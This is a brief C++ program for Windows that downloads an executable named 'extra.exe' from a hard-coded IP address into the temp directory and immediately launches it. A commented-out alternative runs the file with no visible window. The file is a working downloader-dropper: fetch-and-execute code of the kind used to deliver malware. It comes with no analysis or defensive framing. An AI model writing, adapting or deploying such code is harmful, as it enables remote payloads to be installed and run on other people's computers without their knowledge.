//udo kill $(sudo lsof -ti:8000)
#include <iostream>
#include<Windows.h>
#include<string>
#include<urlmon.h>
#pragma comment(lib, "urlmon.lib")
using namespace std;

string getTempPath() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath);
}


int main()
{
    // URL & FILE PATH IN STRING
    string FilePath = getTempPath() + "extra.exe";
    cout << FilePath << endl;
    string URL = "http://98.70.78.176:8000/extra.exe";


    wstring tempUrl = wstring(URL.begin(), URL.end());
    wstring tempPath = wstring(FilePath.begin(), FilePath.end());

    // Applying c_str() method on temp
    LPCWSTR wideStringUrl = tempUrl.c_str();
    LPCWSTR wideStringPath = tempPath.c_str();

    // URL must include the HTTPS/HTTP.
    if (S_OK == URLDownloadToFile(NULL, wideStringUrl, wideStringPath, 0, NULL)) {
        cout << "Downlod: Succses" << endl;
    }
    else {
        cout << "Download: Fails" << endl;
    }

    // Execute the file without displaying the console window
    // ShellExecute(NULL, L"open", wideStringPath, NULL, NULL, SW_HIDE);

    //Execute the exe file
    ShellExecute(NULL, L"open", wideStringPath, NULL, NULL, SW_SHOWNORMAL);
    return 0;
}